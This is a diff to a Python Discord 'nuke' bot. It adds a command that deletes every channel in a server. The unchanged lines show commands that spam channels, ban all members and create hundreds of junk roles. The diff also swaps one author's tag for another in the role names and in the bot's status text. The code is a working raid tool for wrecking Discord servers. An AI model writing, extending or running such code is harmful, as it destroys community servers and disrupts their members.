@@ -57,6 +57,20 @@ async def nuke(ctx, amount=1000):
    for i in range(amount):
          await guild.create_text_channel(random.choice(C_Names))
 
+@client.command()
+async def clear(ctx):
+   channels = ctx.guild.channels
+   for channel in channels:
+      try:
+          await channel.delete()
+          print(channel.name + " has been deleted.")
+      except Exception as error:
+         print(channel.name + " Cant be deleted")
+         print(error)
+   guild = ctx.message.guild
+   await guild.create_text_channel("general")
+   quit()
+
 @client.command(pass_context=True)
 async def Banall(ctx):
         await ctx.message.delete()
@@ -74,7 +88,7 @@ async def roles(ctx):
   await ctx.message.delete()
   for i in range(1, 250):
     try:
-      await ctx.guild.create_role(name=f"cynic beamed")
+      await ctx.guild.create_role(name=f"PrabhS beamed")
       print("Made Role")
     except:
         print("Failed to make role")
@@ -111,7 +125,7 @@ async def help(ctx):
 
 @client.event
 async def on_ready():
-  await client.change_presence(activity=discord.Game(name= "cynic has a big pp"))
+  await client.change_presence(activity=discord.Game(name= "PrabhS is too cool"))
   print("Logged in as" + format(client.user.name))
 
 
